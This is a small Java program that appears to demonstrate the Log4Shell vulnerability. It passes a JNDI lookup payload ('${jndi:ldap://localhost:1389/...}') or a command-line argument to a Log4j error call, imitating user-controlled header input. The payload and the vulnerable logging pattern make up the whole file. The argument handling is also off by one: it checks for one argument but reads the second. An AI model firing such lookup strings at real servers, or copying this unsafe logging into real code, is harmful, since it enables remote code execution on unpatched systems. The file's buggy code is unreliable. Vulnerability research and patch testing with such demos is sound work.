package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    public static void main(String[] args) {
        System.out.println("Running main and logging a user controlled variable (e.g. HTTP Header)");
        Logger logger = LogManager.getLogger();
        String loggingStatement = "${jndi:ldap://localhost:1389/o=reference}";
        if (args.length >= 1) {
            loggingStatement = args[1];
        }

        logger.error(loggingStatement);
    }
}